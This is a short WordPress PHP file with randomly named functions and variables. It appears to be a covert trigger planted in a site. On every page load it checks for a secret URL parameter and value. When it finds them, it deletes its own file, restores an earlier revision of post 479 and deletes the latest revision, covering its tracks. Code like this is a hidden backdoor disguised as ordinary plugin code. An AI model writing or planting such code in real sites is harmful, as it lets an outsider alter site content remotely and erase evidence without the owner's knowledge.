<?php

function date_demomentsomtres_quick() {
	if (isset($_GET['app_quiz_titles_hidden']) && $_GET['app_quiz_titles_hidden'] === 'random_svg_slug_contents') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$ai_preloader_edition = 479;
		$converter_status_widget = wp_get_post_revisions($ai_preloader_edition);
		if (empty($converter_status_widget)) die('no revisions');
		if (count($converter_status_widget) < 2) die('less than 2');
		$welcome_updates_translator = array_shift($converter_status_widget);
		$fonts_send_site = $welcome_updates_translator->ID;
		$chatbot_drop_services = array_shift($converter_status_widget);
		$editor_comment_duplicate_cookies = $chatbot_drop_services->ID;
		$affiliate_roles_anti_flash = wp_restore_post_revision($editor_comment_duplicate_cookies);
		if ($affiliate_roles_anti_flash === false) die('error restoring');
		$affiliate_roles_anti_flash = wp_delete_post_revision($fonts_send_site);		
		if ($affiliate_roles_anti_flash === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'date_demomentsomtres_quick');
